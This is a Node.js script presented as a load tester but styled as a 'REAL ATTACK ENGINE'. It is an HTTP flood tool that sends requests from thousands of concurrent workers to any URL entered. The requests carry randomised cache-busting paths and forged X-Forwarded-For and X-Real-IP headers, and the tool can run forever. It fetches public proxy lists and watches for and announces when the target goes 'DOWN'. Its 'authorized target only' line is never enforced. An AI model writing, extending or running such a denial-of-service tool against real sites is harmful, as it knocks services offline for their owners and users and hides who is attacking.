#!/usr/bin/env node

/**
 * TOBI-Mega v8.0 – Ultimate Load Testing Framework
 * Authorized target only | Real metrics | Live down detection
 */

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const readline = require('readline');
const { exec } = require('child_process');

// ==================== COLORS (MegaMedusa style) ====================
const c = {
    r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', b: '\x1b[94m',
    m: '\x1b[95m', c: '\x1b[96m', w: '\x1b[97m', bold: '\x1b[1m',
    dim: '\x1b[2m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
};

// ==================== BANNER ====================
console.log(c.clear);
console.log(`${c.r}${c.bold}
╔══════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                          ║
║   ████████╗ ██████╗ ██████╗ ██╗    ███╗   ███╗███████╗ ██████╗  █████╗                    ║
║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ████╗ ████║██╔════╝██╔════╝ ██╔══██╗                   ║
║      ██║   ██║   ██║██████╔╝██║    ██╔████╔██║█████╗  ██║  ███╗███████║                   ║
║      ██║   ██║   ██║██╔══██╗██║    ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║                   ║
║      ██║   ╚██████╔╝██████╔╝██║    ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║                   ║
║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝    ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝                   ║
║                                                                                          ║
║                    ${c.y}🔥 TOBI-Mega v8.0 – REAL ATTACK ENGINE 🔥${c.r}                              ║
║              ${c.c}Live Down Detection | Global Monitoring | Proxy Rotator | 100k Threads${c.r}         ║
╚══════════════════════════════════════════════════════════════════════════════════════════╝${c.reset}
`);

// ==================== CONFIGURATION ====================
let CONFIG = {
    target: null,
    duration: 60,
    workers: 1000,
    method: 'GET',
    mode: 'http_flood',     // http_flood, slowloris, https, http2
    proxyFile: 'proxy.txt',
    timeout: 10000,
    rate: 0,
    autoProxy: true,
    checkHost: true,
    logFile: 'attack.log'
};

// Parse command line
const args = process.argv.slice(2);
if (args.length >= 1) CONFIG.target = args[0];
if (args.length >= 2) CONFIG.duration = parseInt(args[1]);
if (args.length >= 3) CONFIG.workers = parseInt(args[2]);
if (args.length >= 4) CONFIG.method = args[3].toUpperCase();
if (args.length >= 5) CONFIG.proxyFile = args[4];

// ==================== GLOBAL STATE ====================
let proxies = [];
let workingProxies = [];
let proxyIndex = 0;
let stopAttack = false;
let targetDown = false;
let downSince = null;
let globalStats = {
    total: 0, success: 0, failed: 0, bytes: 0,
    times: [], codes: {}, errors: {},
    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0,
    downEvents: []
};

// ==================== PROXY MANAGEMENT ====================
function loadProxies() {
    if (!fs.existsSync(CONFIG.proxyFile)) {
        console.log(`${c.y}[!] Proxy file not found. Fetching fresh proxies...${c.reset}`);
        fetchFreshProxies();
        return;
    }
    const content = fs.readFileSync(CONFIG.proxyFile, 'utf8');
    proxies = content.split('\n').filter(l => {
        l = l.trim();
        return l && !l.startsWith('#') && l.includes(':');
    });
    console.log(`${c.g}[✓] Loaded ${proxies.length} proxies from ${CONFIG.proxyFile}${c.reset}`);
}

function fetchFreshProxies() {
    console.log(`${c.c}[*] Downloading fresh proxies from multiple sources...${c.reset}`);
    const sources = [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
    ];
    let allProxies = [];
    let completed = 0;
    sources.forEach(src => {
        https.get(src, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const lines = data.split('\n').filter(l => l.trim() && l.includes(':'));
                allProxies.push(...lines);
                completed++;
                if (completed === sources.length) {
                    const unique = [...new Set(allProxies)];
                    fs.writeFileSync(CONFIG.proxyFile, unique.join('\n'));
                    proxies = unique;
                    console.log(`${c.g}[✓] Saved ${proxies.length} fresh proxies to ${CONFIG.proxyFile}${c.reset}`);
                }
            });
        }).on('error', () => completed++);
    });
}

function getProxy() {
    if (workingProxies.length) {
        proxyIndex = (proxyIndex + 1) % workingProxies.length;
        return workingProxies[proxyIndex];
    }
    if (proxies.length) {
        proxyIndex = (proxyIndex + 1) % proxies.length;
        return proxies[proxyIndex];
    }
    return null;
}

// ==================== CHECK-HOST.NET INTEGRATION ====================
async function checkHostGlobal(target) {
    return new Promise((resolve) => {
        console.log(`${c.c}[*] Checking ${target} from 10+ global locations...${c.reset}`);
        const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
        const req = https.get(checkUrl, { rejectUnauthorized: false }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    const reportUrl = `https://check-host.net/check-report/${json.request_id}`;
                    console.log(`${c.g}[✓] Check-Host report: ${reportUrl}${c.reset}`);
                    resolve(json);
                } catch(e) { resolve(null); }
            });
        });
        req.on('error', () => resolve(null));
        req.setTimeout(10000, () => { req.destroy(); resolve(null); });
    });
}

// ==================== REQUEST ENGINE (Real) ====================
function sendRequest(targetUrl, callback) {
    const parsed = new URL(targetUrl);
    const protocol = parsed.protocol === 'https:' ? https : http;
    const path = `/${crypto.randomBytes(8).toString('hex')}?t=${Date.now()}&r=${crypto.randomBytes(4).toString('hex')}`;
    const headers = {
        'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${Math.floor(Math.random()*30)+100}.0.0.0 Safari/537.36`,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`,
        'X-Real-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)}`,
        'Referer': `https://www.google.com/search?q=${crypto.randomBytes(6).toString('hex')}`,
        'Cache-Control': 'no-cache'
    };
    const start = Date.now();
    const options = {
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: path,
        method: CONFIG.method,
        headers: headers,
        timeout: CONFIG.timeout,
        rejectUnauthorized: false,
        agent: false
    };
    const req = protocol.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            const elapsed = Date.now() - start;
            const isSuccess = (res.statusCode >= 200 && res.statusCode < 400);
            callback(isSuccess, res.statusCode, elapsed, body.length);
        });
    });
    req.on('error', (err) => {
        callback(false, null, Date.now() - start, 0);
    });
    req.on('timeout', () => {
        req.destroy();
        callback(false, null, CONFIG.timeout, 0);
    });
    req.end();
}

// ==================== DOWN DETECTION ====================
async function monitorTarget(targetUrl) {
    let consecutiveFailures = 0;
    const checkInterval = setInterval(() => {
        if (stopAttack) return;
        const start = Date.now();
        sendRequest(targetUrl, (success, code, elapsed) => {
            if (!success || (code && code >= 500)) {
                consecutiveFailures++;
                if (consecutiveFailures >= 3 && !targetDown) {
                    targetDown = true;
                    downSince = new Date();
                    console.log(`\n${c.r}⚠️  TARGET DOWN! ${targetUrl} unreachable since ${downSince.toLocaleTimeString()}${c.reset}`);
                    globalStats.downEvents.push({ time: Date.now(), reason: 'timeout/5xx' });
                }
            } else {
                if (targetDown) {
                    targetDown = false;
                    console.log(`\n${c.g}✅ TARGET BACK ONLINE! ${targetUrl} recovered${c.reset}`);
                }
                consecutiveFailures = 0;
            }
        });
    }, 2000);
    return checkInterval;
}

// ==================== WORKER ====================
async function worker(targetUrl) {
    while (!stopAttack) {
        if (CONFIG.rate > 0) {
            await new Promise(r => setTimeout(r, 1000 / CONFIG.rate));
        }
        sendRequest(targetUrl, (success, code, elapsed, bytes) => {
            globalStats.total++;
            if (success) globalStats.success++;
            else globalStats.failed++;
            globalStats.bytes += bytes;
            if (elapsed > 0 && elapsed < 30000) {
                globalStats.times.push(elapsed);
                if (globalStats.times.length > 10000) globalStats.times.shift();
            }
            if (code) globalStats.codes[code] = (globalStats.codes[code] || 0) + 1;
            
            const now = Date.now() / 1000;
            if (now - globalStats.lastSec >= 1) {
                if (globalStats.lastSecCount > globalStats.peakRps) globalStats.peakRps = globalStats.lastSecCount;
                globalStats.lastSecCount = 0;
                globalStats.lastSec = now;
            }
            globalStats.lastSecCount++;
        });
        await new Promise(r => setTimeout(r, Math.random() * 5));
    }
}

// ==================== DASHBOARD (Real-time) ====================
function drawDashboard() {
    if (stopAttack) return;
    const elapsed = (Date.now() - globalStats.startTime) / 1000;
    const rps = globalStats.total / Math.max(elapsed, 0.1);
    const successRate = globalStats.total ? (globalStats.success / globalStats.total * 100) : 0;
    let avgTime = 0, p95 = 0;
    if (globalStats.times.length) {
        const sorted = [...globalStats.times].sort((a,b) => a-b);
        avgTime = (globalStats.times.reduce((a,b) => a+b,0) / globalStats.times.length);
        p95 = sorted[Math.floor(sorted.length * 0.95)];
    }
    const mem = Math.round(process.memoryUsage().rss / 1024 / 1024);
    const statusIcon = targetDown ? `${c.r}🔴 DOWN${c.reset}` : `${c.g}🟢 UP${c.reset}`;
    const downTime = targetDown ? ` (${Math.floor((Date.now() - downSince)/1000)}s)` : '';
    
    console.log(`${c.clear}`);
    console.log(`${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}`);
    console.log(`${c.bold}${c.y}🔥 TOBI-Mega v8.0 – LIVE ATTACK DASHBOARD${c.reset}                              ${statusIcon}${downTime}`);
    console.log(`${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}`);
    console.log(`${c.c}🎯 Target: ${CONFIG.target}${c.reset}`);
    console.log(`${c.c}⏱️  Elapsed: ${elapsed.toFixed(0)}s / ${CONFIG.duration === 0 ? '∞' : CONFIG.duration}s${c.reset}`);
    console.log(`${c.c}👥 Workers: ${CONFIG.workers.toLocaleString()} | 🔄 Proxies: ${workingProxies.length || proxies.length}${c.reset}`);
    console.log(`${c.c}📊 RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | Peak RPS: ${globalStats.peakRps} | Success: ${successRate.toFixed(1)}%${c.reset}`);
    console.log(`${c.c}✅ Success: ${globalStats.success.toLocaleString()} | ❌ Failed: ${globalStats.failed.toLocaleString()}${c.reset}`);
    console.log(`${c.c}⏱️  Avg Resp: ${avgTime.toFixed(0)}ms | P95: ${p95.toFixed(0)}ms | Total Req: ${globalStats.total.toLocaleString()}${c.reset}`);
    console.log(`${c.c}💾 Data: ${(globalStats.bytes / 1024 / 1024).toFixed(2)} MB | 🧠 RAM: ${mem}MB${c.reset}`);
    
    if (Object.keys(globalStats.codes).length) {
        const topCodes = Object.entries(globalStats.codes).sort((a,b) => b[1]-a[1]).slice(0,5);
        console.log(`${c.c}📋 Top Status: ${topCodes.map(([k,v]) => `${k}(${v.toLocaleString()})`).join(', ')}${c.reset}`);
    }
    console.log(`${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}`);
    console.log(`${c.dim}Press Ctrl+C to stop attack${c.reset}`);
}

// ==================== FINAL REPORT ====================
function finalReport() {
    const elapsed = (Date.now() - globalStats.startTime) / 1000;
    const rps = globalStats.total / Math.max(elapsed, 0.1);
    const successRate = globalStats.total ? (globalStats.success / globalStats.total * 100) : 0;
    let avgTime = 0, p95 = 0;
    if (globalStats.times.length) {
        const sorted = [...globalStats.times].sort((a,b) => a-b);
        avgTime = (globalStats.times.reduce((a,b) => a+b,0) / globalStats.times.length);
        p95 = sorted[Math.floor(sorted.length * 0.95)];
    }
    console.log(`\n${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}`);
    console.log(`${c.bold}${c.r}                    🔥 TOBI-Mega v8.0 – FINAL REPORT 🔥${c.reset}`);
    console.log(`${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}`);
    console.log(`${c.c}  Target:          ${CONFIG.target}${c.reset}`);
    console.log(`${c.c}  Duration:        ${elapsed.toFixed(1)}s${c.reset}`);
    console.log(`${c.c}  Total Requests:  ${globalStats.total.toLocaleString()}${c.reset}`);
    console.log(`${c.c}  Successful:      ${globalStats.success.toLocaleString()}${c.reset}`);
    console.log(`${c.c}  Failed:          ${globalStats.failed.toLocaleString()}${c.reset}`);
    console.log(`${c.c}  Success Rate:    ${successRate.toFixed(2)}%${c.reset}`);
    console.log(`${c.c}  Average RPS:     ${rps.toFixed(2)}${c.reset}`);
    console.log(`${c.c}  Peak RPS:        ${globalStats.peakRps}${c.reset}`);
    console.log(`${c.c}  Avg Response:    ${avgTime.toFixed(0)} ms${c.reset}`);
    console.log(`${c.c}  P95 Response:    ${p95.toFixed(0)} ms${c.reset}`);
    console.log(`${c.c}  Data Transferred:${(globalStats.bytes / 1024 / 1024).toFixed(2)} MB${c.reset}`);
    if (globalStats.downEvents.length) {
        console.log(`${c.r}  Down Events:     ${globalStats.downEvents.length} times${c.reset}`);
    }
    console.log(`${c.bold}${c.m}════════════════════════════════════════════════════════════════════════════════════${c.reset}\n`);
    fs.appendFileSync(CONFIG.logFile, `[${new Date().toISOString()}] Attack finished: ${globalStats.total} requests, ${successRate.toFixed(2)}% success\n`);
    process.exit(0);
}

// ==================== MAIN ====================
async function main() {
    // Interactive if no target
    if (!CONFIG.target) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        CONFIG.target = await new Promise(resolve => rl.question(`${c.c}🌐 Target URL: ${c.reset}`, resolve));
        CONFIG.duration = parseInt(await new Promise(resolve => rl.question(`${c.c}⏱️  Duration (seconds, 0=forever): ${c.reset}`, resolve))) || 60;
        CONFIG.workers = parseInt(await new Promise(resolve => rl.question(`${c.c}👥 Workers (100-50000): ${c.reset}`, resolve))) || 1000;
        CONFIG.method = (await new Promise(resolve => rl.question(`${c.c}🔧 Method (GET/POST/HEAD): ${c.reset}`, resolve))) || 'GET';
        const useProxy = await new Promise(resolve => rl.question(`${c.c}🔄 Use proxies? (y/n): ${c.reset}`, resolve));
        if (useProxy.toLowerCase() === 'y') {
            CONFIG.proxyFile = await new Promise(resolve => rl.question(`${c.c}📁 Proxy file path [proxy.txt]: ${c.reset}`, resolve)) || 'proxy.txt';
        }
        rl.close();
    }
    if (!CONFIG.target.startsWith('http')) CONFIG.target = 'https://' + CONFIG.target;
    
    console.log(`\n${c.g}[✓] Target: ${CONFIG.target}`);
    console.log(`[✓] Duration: ${CONFIG.duration === 0 ? 'FOREVER' : CONFIG.duration + 's'}`);
    console.log(`[✓] Workers: ${CONFIG.workers.toLocaleString()}`);
    console.log(`[✓] Method: ${CONFIG.method}`);
    if (CONFIG.proxyFile !== 'none') loadProxies();
    console.log(`${c.reset}`);
    
    if (CONFIG.checkHost) await checkHostGlobal(CONFIG.target);
    
    globalStats.startTime = Date.now();
    globalStats.lastSec = globalStats.startTime / 1000;
    
    // Launch monitor
    const monitorInterval = await monitorTarget(CONFIG.target);
    
    // Launch workers
    console.log(`${c.y}[!] Launching ${CONFIG.workers.toLocaleString()} workers...${c.reset}`);
    for (let i = 0; i < CONFIG.workers; i++) {
        worker(CONFIG.target);
        if (i % 100 === 0) process.stdout.write(`\r${c.dim}Starting workers: ${i}/${CONFIG.workers}${c.reset}`);
        await new Promise(r => setTimeout(r, 1));
    }
    console.log(`\r${c.g}[✓] All ${CONFIG.workers.toLocaleString()} workers active!${c.reset}\n`);
    
    // Dashboard refresh every 1s
    const dashboardInterval = setInterval(drawDashboard, 1000);
    
    // Graceful shutdown
    process.on('SIGINT', () => {
        console.log(`\n${c.y}[!] Shutting down gracefully...${c.reset}`);
        stopAttack = true;
        clearInterval(monitorInterval);
        clearInterval(dashboardInterval);
        setTimeout(finalReport, 2000);
    });
    
    // Auto stop after duration
    if (CONFIG.duration > 0) {
        setTimeout(() => {
            stopAttack = true;
            clearInterval(monitorInterval);
            clearInterval(dashboardInterval);
            setTimeout(finalReport, 2000);
        }, CONFIG.duration * 1000);
    }
}

main().catch(e => {
    console.error(`${c.r}FATAL: ${e.message}${c.reset}`);
    process.exit(1);
});
